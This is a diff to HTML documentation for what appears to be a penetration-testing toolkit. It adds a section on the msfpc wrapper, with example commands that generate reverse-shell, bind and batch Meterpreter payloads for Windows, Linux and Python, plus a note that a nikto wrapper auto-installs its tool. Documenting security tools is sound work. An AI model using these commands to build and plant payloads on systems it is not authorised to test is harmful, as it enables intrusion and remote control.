@@ -1697,6 +1697,7 @@ vulnerability scan against the specified target host.</p>
 <ol type="1">
 <li>Executes <code>nikto</code> with the <code>-h</code> option to
 specify the target host IP address.</li>
+<li>Installs <code>nikto</code> if it is not already installed.</li>
 </ol>
 <p>:param line: This parameter is not used in the current implementation
 but could be used to specify additional options or arguments if needed.
@@ -3341,6 +3342,25 @@ command: davtest –url <url></p>
 <p>Replace <code>&lt;url&gt;</code> with the URL of the WebDAV server
 you want to test.</p>
 <p>For example: davtest –url http://example.com/webdav</p>
+<h2 id="msfpc">msfpc</h2>
+<p>Generates payloads using MSFvenom Payload Creator (MSFPC).</p>
+<p>This function checks if <code>msfpc</code> is installed and installs
+it if necessary. It then runs <code>msfpc</code> with the specified
+parameters to create a payload for penetration testing.</p>
+<p>:param line: Not used in this implementation but reserved for future
+use.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually generate a payload using MSFPC, use the
+following command: msfpc <TYPE> <DOMAIN/IP> <PORT> <CMD/MSF>
+<BIND/REVERSE> <STAGED/STAGELESS> <TCP/HTTP/HTTPS/FIND_PORT>
+<BATCH/LOOP> <VERBOSE></p>
+<p>Replace the placeholders with the desired values. For example: msfpc
+windows 192.168.1.10 4444 reverse stageless tcp verbose</p>
+<p>Example usage: msfpc windows 192.168.1.10 # Windows &amp; manual IP.
+msfpc elf bind eth0 4444 # Linux, eth0’s IP &amp; manual port. msfpc
+stageless cmd py https # Python, stageless command prompt. msfpc verbose
+loop eth1 # A payload for every type, using eth1’s IP. msfpc msf batch
+wan # All possible Meterpreter payloads, using WAN IP.</p>
 <h2 id="find_tgts">find_tgts</h2>
 <p>No description available.</p>
 <h2 id="setup_handler">setup_handler</h2>
